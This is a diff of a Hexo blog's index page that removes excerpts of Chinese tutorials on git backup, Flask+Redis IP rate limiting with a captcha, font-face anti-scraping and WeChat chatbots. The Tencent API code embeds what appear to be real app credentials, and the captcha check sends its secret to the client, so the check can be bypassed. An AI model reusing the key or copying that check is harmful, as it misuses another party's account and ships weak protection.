@@ -149,56 +149,6 @@
     
     
     <article
-  id="post-加密（复件）"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2021/01/16/%E5%8A%A0%E5%AF%86%EF%BC%88%E5%A4%8D%E4%BB%B6%EF%BC%89/"
-    >test 1</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2021/01/16/%E5%8A%A0%E5%AF%86%EF%BC%88%E5%A4%8D%E4%BB%B6%EF%BC%89/" class="article-date">
-  <time datetime="2021-01-15T16:00:00.000Z" itemprop="datePublished">2021-01-16</time>
-</a>    
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  Here's something encrypted, password is required to continue reading. 
-      <a class="article-more-link" href="/2021/01/16/%E5%8A%A0%E5%AF%86%EF%BC%88%E5%A4%8D%E4%BB%B6%EF%BC%89/"
-        >--more--</a
-      >
-       
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
   id="post-github之hexo源码备份和应用"
   class="article article-type-post"
   itemscope
@@ -220,39 +170,20 @@
     <div class="article-meta">
       <a href="/2020/11/09/github%E4%B9%8Bhexo%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E5%92%8C%E5%BA%94%E7%94%A8/" class="article-date">
   <time datetime="2020-11-08T16:00:00.000Z" itemprop="datePublished">2020-11-09</time>
-</a>    
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </div>
+   
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="1-使用git分支保存hexo博客源码"><a href="#1-使用git分支保存hexo博客源码" class="headerlink" title="1.使用git分支保存hexo博客源码"></a>1.使用git分支保存hexo博客源码</h1><p>具体操作请<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/133860750">跳转到页面。</a></p>
-<h1 id="2-为新电脑添加SSH-keys"><a href="#2-为新电脑添加SSH-keys" class="headerlink" title="2.为新电脑添加SSH keys"></a>2.为新电脑添加SSH keys</h1><p>当你需要在一台新设备上继续写博客上，可以通过github的源码来快速搭建原环境，为了能够使用git clone、push等操作，需要在新电脑上设置github环境，并将SSH keys存储到github中，具体操作请跳转到<a href="https://wxt406611016.github.io/2019/02/07/github+hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">我之前的一篇博客</a>中4，5，6节部分。</p>
-<h1 id="3-将hexo源码clone到本地"><a href="#3-将hexo源码clone到本地" class="headerlink" title="3.将hexo源码clone到本地"></a>3.将hexo源码clone到本地</h1><p>新设备空空如也，需要将hexo源码克隆到本地，具体操作也在第一步的文档中，<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/133860750">跳转！</a></p>
-<h1 id="4-配置hexo所需环境"><a href="#4-配置hexo所需环境" class="headerlink" title="4.配置hexo所需环境"></a>4.配置hexo所需环境</h1><p>将源码clone到本地还不够，还需要配置hexo所需环境，如nodejs，npm。。。这里我们使用nvm来安装，具体操作也在第二步的文档中，<a target="_blank" rel="noopener" href="https://zhuxiaoxia.blog.csdn.net/article/details/88855256?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-5.compare&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-5.compare">跳转！</a>中从第2节开始看。</p>
-<h1 id="5-Deploy和Push"><a href="#5-Deploy和Push" class="headerlink" title="5.Deploy和Push"></a>5.Deploy和Push</h1><p>到这一步基本都配置好了，需要测试使得</p>
-<ol>
-<li><p>hexo d操作能部署博客到github博客仓库的显示分支，_config.yml中默认将hexo d部署到master分支，所以不用修改，直接hexo g，hexo d一顿操作就完事儿了，如果想在本地先调试，就在hexo g后跟一个hexo s。</p>
-</li>
-<li><p>git push操作能将博客源码更新到github博客仓库的源码分支，</p>
-<ol>
-<li><p>(可选)如果你是从github上clone下来的源代码，则不需要本步骤。否则的话先本地关联远程仓库：</p>
-<p> <code>git remote add origin git@github.com:yourblog/yourblog.github.io.git</code></p>
-</li>
-<li><p>接着git三部曲就完事儿了:</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .    #添加所有文件到暂存区</span><br><span class="line">git commit -m &quot;date&quot;     #提交，标记我此处用了date字符串</span><br><span class="line">git push origin source     #推送到源码分支source</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-</ol>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
     <footer class="article-footer">
        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li></ul>
+
     </footer>
   </div>
 
@@ -284,39 +215,20 @@
     <div class="article-meta">
       <a href="/2020/04/11/flask+redis-%E9%99%90%E5%88%B6ip%E8%AE%BF%E9%97%AE%E9%A2%91%E7%8E%87/" class="article-date">
   <time datetime="2020-04-10T16:00:00.000Z" itemprop="datePublished">2020-04-11</time>
-</a>    
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </div>
+   
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <p><strong>上篇介绍了利用font-face进行反爬虫，这篇介绍另一种常见方法–验证码校验，对频繁访问的ip进行限制，强制要求验证码验证，验证成功方可继续访问。</strong></p>
-<h2 id="1-限制逻辑-策略："><a href="#1-限制逻辑-策略：" class="headerlink" title="1.限制逻辑/策略："></a>1.限制逻辑/策略：</h2><ol>
-<li>利用request.remote_addr获取客户端ip；</li>
-<li>客户端访问时，服务器判断redis中是否有客户端ip；</li>
-<li>若不存在，将客户端ip存入redis中，对应值设为1；若存在，客户端ip对应值+1；</li>
-<li>若redis中客户端ip对应值在5分钟内&gt;5，即5分钟内访问页面超过5次，则视为恶意ip，跳转至验证码校验页面；</li>
-<li>验证成功后，向后端请求过渡函数B，进行redis操作，B函数的功能为将验证成功的ip从redis中删除，删除后再重定向至开始页面；</li>
-</ol>
-<h2 id="2-代码实现限制逻辑："><a href="#2-代码实现限制逻辑：" class="headerlink" title="2.代码实现限制逻辑："></a>2.代码实现限制逻辑：</h2><p>后端代码如下，index()方法用于判断redis中是否存在客户端ip，以及ip对应值是否大于5：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])</span><br><span class="line">def index():</span><br><span class="line">    ip&#x3D;request.remote_addr</span><br><span class="line">    if(rs.exists(ip)):                                         #rs可操作redis</span><br><span class="line">        rs.setrange(ip,0,int(rs.get(ip))+1)</span><br><span class="line">    else:</span><br><span class="line">        rs.set(ip,1,ex&#x3D;300)                               #5分钟5次</span><br><span class="line">    if (int(rs.get(ip))&lt;6):</span><br><span class="line">        return render_template(&#39;index.html&#39;)           #正常返回</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&quot;antibot.html&quot;,ip&#x3D;ip,secret&#x3D;secret)    #返回验证码校验页面</span><br></pre></td></tr></table></figure>
-<p>如果跳转至antibot.html(验证码校验页面)后，前端通过js对参数a进行base64加密，并带参数访问/mid页面，之所以要带参数，是为了在后端验证参数是否有效(即判断是否是通过验证码校验后跳转而来)：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">......</span><br><span class="line">onSuccess: function() &#123;</span><br><span class="line">      document.getElementById(&#39;msg&#39;).innerHTML &#x3D; &#39;登录成功！&#39;</span><br><span class="line">      var a&#x3D;&quot;&#123;&#123;ip&#125;&#125;&quot;+&quot;&#123;&#123;secret&#125;&#125;&quot;                   &#x2F;&#x2F;secret是从后端传来的随机密钥</span><br><span class="line">      a&#x3D;window.btoa(a)                                 &#x2F;&#x2F;对变量a进行base64加密</span><br><span class="line">      window.location.href&#x3D;&quot;&#x2F;mid?id&#x3D;&quot;+a</span><br><span class="line">    &#125;,</span><br><span class="line">......</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-<p>mid()方法用于通过验证码校验后，将ip从redis中删除，并重定向至开始页面：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;mid&#39;, methods&#x3D;[&#39;GET&#39;])</span><br><span class="line">def mid():</span><br><span class="line">    cmp&#x3D;request.args.get(&#39;id&#39;,&#39;0&#39;)</span><br><span class="line">    ip&#x3D;request.remote_addr</span><br><span class="line">    sec&#x3D;ip+secret                                                 #secret作为随机密钥进行加密</span><br><span class="line">    result&#x3D;base64.b64encode(sec.encode())</span><br><span class="line">    result&#x3D;str(result)[2:-1]</span><br><span class="line">    if(cmp&#x3D;&#x3D;result):                                            #判断前端js传来的参数是否有效</span><br><span class="line">        rs.delete(ip)</span><br><span class="line">    response &#x3D;  redirect(url_for(&#39;index&#39;))</span><br><span class="line">    return response    </span><br></pre></td></tr></table></figure>
-<h2 id="3-效果展示："><a href="#3-效果展示：" class="headerlink" title="3.效果展示："></a>3.效果展示：</h2><p>打开flask项目，可以正常访问：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1ltMGtMUS5wbmc?x-oss-process=image/format,png" alt="正常访问"><br>刷新5次后，触发了限制ip策略，返回验证码校验界面：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1ltMEZzZy5wbmc?x-oss-process=image/format,png" alt="返回验证码校验"><br>验证成功后，成功返回开始页面。从而实现了flask上用redis进行限制ip访问频率。</p>
-<h2 id="PS-若设置反向代理需注意！！！"><a href="#PS-若设置反向代理需注意！！！" class="headerlink" title="PS:若设置反向代理需注意！！！"></a>PS:若设置反向代理需注意！！！</h2><p>如果设置了反向代理的话，request.remote_addr则不会返回客户端的真实ip。以nginx反向代理为例，客户想要访问服务器，实际请求路线是client-&gt;nginx-&gt;server，而request.remote_addr表示的是上一级ip，而server的上一级ip是nginx服务器的ip.</p>
-<p>解决办法：以nginx为例，在配置文件中使用X-Forwarded-For，然后后端获取ip方式由 <code>ip=request.remote_addr</code>更改为<code>ip = request.headers.getlist(&quot;X-Forwarded-For&quot;)[0]</code> 即可。</p>
-<p><a target="_blank" rel="noopener" href="http://wxt123.top/">访问上图中我的web项目，点击链接即可，</a></p>
-<h4 id="如有错误或建议，请在评论处指出！"><a href="#如有错误或建议，请在评论处指出！" class="headerlink" title="如有错误或建议，请在评论处指出！"></a>如有错误或建议，请在评论处指出！</h4> 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
     <footer class="article-footer">
        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ip%E9%99%90%E5%88%B6/" rel="tag">ip限制</a></li></ul>
+
     </footer>
   </div>
 
@@ -348,29 +260,20 @@
     <div class="article-meta">
       <a href="/2020/03/02/%E5%8F%8D%E7%88%AC%E8%99%AB%E7%AD%96%E7%95%A5%E4%B9%8Bfont-face/" class="article-date">
   <time datetime="2020-03-01T16:00:00.000Z" itemprop="datePublished">2020-03-02</time>
-</a>    
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </div>
+   
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <p><strong>在互联网快速发展的时代里，爬虫可以说是无处不在。各类热搜以及热点新闻，时时刻刻都在被爬虫获取。如果开发者并不想让内容大范围传播呢？如何应对爬虫呢？常见的方法有验证码验证，以及对频繁登陆ip进行屏蔽，除此之外，还有一种通过font-face自定义字体的方式，可以让爬取到的内容和网页显示的内容完全不一样，从而产生一种是否爬错内容了的感觉。</strong></p>
-<h2 id="1-font-face介绍："><a href="#1-font-face介绍：" class="headerlink" title="1.font-face介绍："></a>1.font-face介绍：</h2><p>谈到font-face，也许很多人并不熟悉，但是说到应用此技术的公司，大家肯定都很熟悉了，58同城，猫眼电影等，都采用了font-face策略来应对爬虫。以<a target="_blank" rel="noopener" href="https://su.58.com/zufang/pn2/?PGTID=0d300008-0000-5965-8ce1-1873463f7758&ClickID=1">58同城</a>为例，打开审查元素，发现页面内的3室2厅1卫 和120㎡中的数字均变成了乱码 —-“驋室麣厅龒卫”,”龒麣龤㎡”。所以即便爬虫找到了正确位置，也依然无法获得正确信息。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1llWkV3Ui5wbmc?x-oss-process=image/format,png" alt="58同城页面信息"></p>
-<h2 id="2-font-face原理："><a href="#2-font-face原理：" class="headerlink" title="2.font-face原理："></a>2.font-face原理：</h2><p>仔细观察审查元素信息，在styles栏里发现了font-family，这就是自定义字体，可以把乱码显示成正常的数字。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1llbVl6OC5wbmc?x-oss-process=image/format,png" alt="审查元素"><br>于是我们要找到font-family字样，右键点击网页源代码，搜索font-family，找到@font-face等关键字，通过分析data:application/font-ttf，可以猜测后面长串字符串应该是对某个ttf字体进行了base64编码。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1lld0Z3bi5wbmc?x-oss-process=image/format,png" alt="查看网页源代码"><br>上python，解码生成ttf字体文件。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from fontTools.ttLib import TTFont</span><br><span class="line">import base64</span><br><span class="line">import io</span><br><span class="line"></span><br><span class="line">key&#x3D;&#39;&#39;&#39;</span><br><span class="line">AAEAAAALAIAAAwAwR1NVQiCLJXoAAAE.......AAAA    #key值为源代码中的长串字符串</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">data &#x3D; base64.b64decode(key) #base64解码</span><br><span class="line">fonts &#x3D; TTFont(io.BytesIO(data)) #生成二进制字节</span><br><span class="line">fonts.save(&#39;font-face.ttf&#39;)</span><br></pre></td></tr></table></figure>
-<p>将生成的font-face.ttf通过<a target="_blank" rel="noopener" href="http://fontstore.baidu.com/static/editor/index.html">百度字体编辑器</a>打开，可以看到对所有数字进行了重新编码。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1llRHJrUi5wbmc?x-oss-process=image/format,png" alt="自定义字体"><br>是不是有点儿疑惑？怎么对数字重新编码？？？其实也可以理解为是对编码对应的图形进行了改变，比如同样是编码(0x9a4b)，在常规字体中是”驋”的模样可能在B字体中就是”2”的模样，在自己设计的字体里，可以任性的把(0x9a4b)编码对应的图形设计成”2”的形状，举个例子:<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1llUmxpNC5qcGc?x-oss-process=image/format,png" alt="自定义字体有不一样的形状"><br>同样是(0x9a4b)编码，在字体A中，你认为是2，在字体B中，即便和字体A中形状不一样，你一样认为是2，但在自定义字体中，你会认为是w。同样的道理，我们可以把常规字体中的乱码，设计成数字的形状。<br>所以在自定义字体的基础上，我们可以变相认为对字体进行了加密，从而起到保护重要数据的作用。</p>
-<h2 id="3-实现font-face："><a href="#3-实现font-face：" class="headerlink" title="3.实现font-face："></a>3.实现font-face：</h2><p>理解了font-face的原理后，我们可以将font-face策略应用到自己的web项目中。为了简便操作，我直接用了第二步中在58同城网站下载的字体hhh(自行设计字体也很cool，想怎么画怎么画)。在前端html文件中加入以下内容:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">@font-face&#123;font-family:&#39;secret&#39;;src:url(&#39;data:application&#x2F;font-ttf;</span><br><span class="line">charset&#x3D;utf-8;base64,AAEAAAALAIAAAwAwR1NVQiCLJXoA.......AAAAAAAAA&#39;)</span><br><span class="line">format(&#39;truetype&#39;)&#125;.strongbox&#123;font-family:&#39;fangchan-secret&#39;,&#39;Hiragino Sans GB&#39;,</span><br><span class="line">&#39;Microsoft yahei&#39;,Arial,sans-serif,&#39;宋体&#39;!important&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.font&#123;font-family:&#39;secret&#39;,&#39;Hiragino Sans GB&#39;,&#39;Microsoft yahei&#39;,Arial,sans-serif,&#39;\5B8B\4F53&#39; !important&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
-<p>上面一段的作用为引入名叫”secret”的自定义字体,然后通过style设计.font，使所有class为”font”的标签应用此自定义字体。换言之，当你想用自定义字体时，在相应的标签中加入class=”font”，如下html源码和前端显示结果:<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1llb3Q5VS5wbmc?x-oss-process=image/format,png" alt="html源码"><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1llb0poVC5wbmc?x-oss-process=image/format,png" alt="前端显示结果"><br>可见2020 04-27日期字样在源码中显示为乱码。<br><a target="_blank" rel="noopener" href="http://wxt123.top/news">访问上图中我的web项目，点击链接即可，</a>(暂时只对页面右侧一栏中的日期做了font-face加密。)</p>
-<h4 id="如有错误或建议，请在评论处指出！"><a href="#如有错误或建议，请在评论处指出！" class="headerlink" title="如有错误或建议，请在评论处指出！"></a>如有错误或建议，请在评论处指出！</h4> 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
     <footer class="article-footer">
        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/font-face/" rel="tag">font-face</a></li></ul>
+
     </footer>
   </div>
 
@@ -402,28 +305,20 @@
     <div class="article-meta">
       <a href="/2020/02/08/python%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E8%B0%83%E7%94%A8%E8%85%BE%E8%AE%AF%E6%99%BA%E8%83%BD%E9%97%B2%E8%81%8A/" class="article-date">
   <time datetime="2020-02-07T16:00:00.000Z" itemprop="datePublished">2020-02-08</time>
-</a>    
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </div>
+   
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <p><strong>继上一篇调用图灵机器人的玩法后，不满于每天100条的限额，于是！！！又找到了腾讯云产品-智能闲聊，免费！无限额！<br><a target="_blank" rel="noopener" href="https://ai.qq.com/">申请智能闲聊</a></strong></p>
-<h2 id="1-构建调用api文件："><a href="#1-构建调用api文件：" class="headerlink" title="1.构建调用api文件："></a>1.构建调用api文件：</h2><p>由于wxpy库没有集成腾讯智能闲聊的api，我们需要自己配置接口，所以会比调用图灵机器人显得麻烦。上python，下面是api.py的内容，主要用于向腾讯云发送请求，并获取回复内容，相当于一个调用api。如下api.py:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">###api.py###</span><br><span class="line">import hashlib</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">from urllib.parse import quote</span><br><span class="line"> </span><br><span class="line">def curlmd5(src):</span><br><span class="line">    m &#x3D; hashlib.md5(src.encode(&#39;UTF-8&#39;))</span><br><span class="line">    return m.hexdigest().upper()               # 将得到的MD5值所有字符转换成大写</span><br><span class="line"> </span><br><span class="line">def get_params(plus_item):                    #用于返回request需要的data内容</span><br><span class="line">    global params</span><br><span class="line">    t &#x3D; time.time()                                             #请求时间戳（秒级）,（保证签名5分钟有效）</span><br><span class="line">    time_stamp&#x3D;str(int(t))</span><br><span class="line">    nonce_str &#x3D; &#39;&#39;.join(random.sample(string.ascii_letters + string.digits, 10))            # 请求随机字符串，用于保证签名不可预测  </span><br><span class="line">    app_id&#x3D;&#39;2135462408&#39;                              # 修改成自己的id  </span><br><span class="line">    app_key&#x3D;&#39;w3Lv6zsb95T89fay&#39;             # 修改成自己的key  </span><br><span class="line">    params &#x3D; &#123;&#39;app_id&#39;:app_id,</span><br><span class="line">              &#39;question&#39;:plus_item,</span><br><span class="line">              &#39;time_stamp&#39;:time_stamp,</span><br><span class="line">              &#39;nonce_str&#39;:nonce_str,</span><br><span class="line">              &#39;session&#39;:&#39;10000&#39;</span><br><span class="line">             &#125;</span><br><span class="line">    sign_before &#x3D; &#39;&#39;</span><br><span class="line">    for key in sorted(params):                      #要对key排序再拼接</span><br><span class="line">        sign_before +&#x3D; &#39;&#123;&#125;&#x3D;&#123;&#125;&amp;&#39;.format(key,quote(params[key], safe&#x3D;&#39;&#39;))    # 拼接过程需要使用quote函数形成URL编码</span><br><span class="line">    sign_before +&#x3D; &#39;app_key&#x3D;&#123;&#125;&#39;.format(app_key)                                           # 将app_key拼接到sign_before后</span><br><span class="line">    sign &#x3D; curlmd5(sign_before)</span><br><span class="line">    params[&#39;sign&#39;] &#x3D; sign                                 # 对sign_before进行MD5运算</span><br><span class="line">    return params                                              #得到request需要的data内容</span><br><span class="line"> </span><br><span class="line">def get_content(plus_item):</span><br><span class="line">    global payload,r</span><br><span class="line">    url &#x3D; &quot;https:&#x2F;&#x2F;api.ai.qq.com&#x2F;fcgi-bin&#x2F;nlp&#x2F;nlp_textchat&quot;         # 聊天的API地址  </span><br><span class="line">    plus_item &#x3D; plus_item.encode(&#39;utf-8&#39;)</span><br><span class="line">    payload &#x3D; get_params(plus_item)</span><br><span class="line">    r &#x3D; requests.post(url,data&#x3D;payload)                                                 #带参请求api地址</span><br><span class="line">    result&#x3D;r.json()[&quot;data&quot;][&quot;answer&quot;]</span><br><span class="line">    return result                                                                                                #获得返回内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="2-与智能闲聊进行聊天"><a href="#2-与智能闲聊进行聊天" class="headerlink" title="2.与智能闲聊进行聊天"></a>2.与智能闲聊进行聊天</h2><p>终于将前提基础工作完成了，调用api构建好后，调用智能闲聊也就很简单了，调用wxpy库，初始化和构建自动发送、回复函数和上一章都一样。为了简化工作，本例中只实现自动回复功能，也是最常用的功能。依然上ai.py的代码，用于聊天。ai.py如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from wxpy import *</span><br><span class="line">from ai import *                                #导入上一步构建的ai.py文件</span><br><span class="line">bot &#x3D; Bot()</span><br><span class="line">friend &#x3D; bot.friends().search(&#39;AIbot&#39;)[0]</span><br><span class="line"></span><br><span class="line">@bot.register(friend)</span><br><span class="line">def auto_reply(msg):</span><br><span class="line">    a&#x3D;msg.text</span><br><span class="line">    answer&#x3D;get_content(a)</span><br><span class="line">    if answer&#x3D;&#x3D;&#39;&#39;:                                 #防止返回内容为空</span><br><span class="line">        for i in range(2):                     </span><br><span class="line">            time.sleep(2)</span><br><span class="line">            answer&#x3D;get_content(a)</span><br><span class="line">            if answer!&#x3D;&#39;&#39; and answer!&#x3D;&quot;emmmm，我不是很懂你的意思&quot;:</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                answer&#x3D;&quot;emmmm，我不是很懂你的意思&quot;</span><br><span class="line">    return &#39;[Stephen] &#123;&#125; &#39;.format(answer)</span><br><span class="line"></span><br><span class="line">bot.join()</span><br></pre></td></tr></table></figure>
-<p>由于访问腾讯api的时候，偶尔会返回空内容，为了避免这种情况，当返回空时，隔2s再请求一次，这般重复3次，如果依然返回空，则自动将返回值设为”emmmm，我不是很懂你的意思”。</p>
-<h2 id="3-效果展示："><a href="#3-效果展示：" class="headerlink" title="3.效果展示："></a>3.效果展示：</h2><p>ps：我已将智能闲聊的名字设为了”Stephen”，上图最重要：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA4L1lteElScy5qcGc?x-oss-process=image/format,png" alt="和智能闲聊增进感情"><br>腾讯智能闲聊的智能化程度也挺高，日常闲聊也没有太大问题，有些回答甚至比图灵机器人还要讨喜，各有千秋吧。最关键的是免费！不限额！<br>尽管wxpy功能很强大，但是部分用户无法登陆微信网页版，也就无法体验wxpy的服务了，可以说是很可惜了！</p>
-<h4 id="如有错误或建议，请在评论处指出！"><a href="#如有错误或建议，请在评论处指出！" class="headerlink" title="如有错误或建议，请在评论处指出！"></a>如有错误或建议，请在评论处指出！</h4> 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
     <footer class="article-footer">
        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%99%BA%E8%83%BD%E9%97%B2%E8%81%8A/" rel="tag">智能闲聊</a></li></ul>
+
     </footer>
   </div>
 
@@ -455,31 +350,20 @@
     <div class="article-meta">
       <a href="/2020/01/12/python%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E8%87%AA%E5%8A%A8%E5%9B%9E%E5%A4%8D+%E5%9B%BE%E7%81%B5%E6%9C%BA%E5%99%A8%E4%BA%BA/" class="article-date">
   <time datetime="2020-01-11T16:00:00.000Z" itemprop="datePublished">2020-01-12</time>
-</a>    
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </div>
+   
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <p><strong>前段时间无意间看到wxpy，彷佛捡到了宝，立马开始探索用python玩微信，可以将很多操作自动化，既方便又有趣。<br>wxpy是 在 itchat 的基础上，通过大量接口优化提升了模块的易用性，并进行丰富的功能扩展，其中就包括平时常用的自动回复，主动发消息，甚至还能引入智能聊天机器人。话不多说，上python！<br><a target="_blank" rel="noopener" href="https://wxpy.readthedocs.io/zh/latest/">更多玩法关注wxpy官方文档</a></strong></p>
-<h2 id="1-初始化："><a href="#1-初始化：" class="headerlink" title="1.初始化："></a>1.初始化：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from wxpy import *           # 导入模块</span><br><span class="line">bot &#x3D; Bot()                             # 初始化机器人，扫码登陆 </span><br><span class="line">friend &#x3D; bot.friends().search(&#39;AIbot&#39;)[0]       #搜索昵称为&quot;AIbot&quot;的好友</span><br><span class="line">group &#x3D; bot.groups().search(&#39;test&#39;)[0]          #搜索名称为&quot;test&quot;的群聊</span><br></pre></td></tr></table></figure>
-<h2 id="2-自动发送、回复指定消息："><a href="#2-自动发送、回复指定消息：" class="headerlink" title="2.自动发送、回复指定消息："></a>2.自动发送、回复指定消息：</h2><p>自动发送消息：</p>
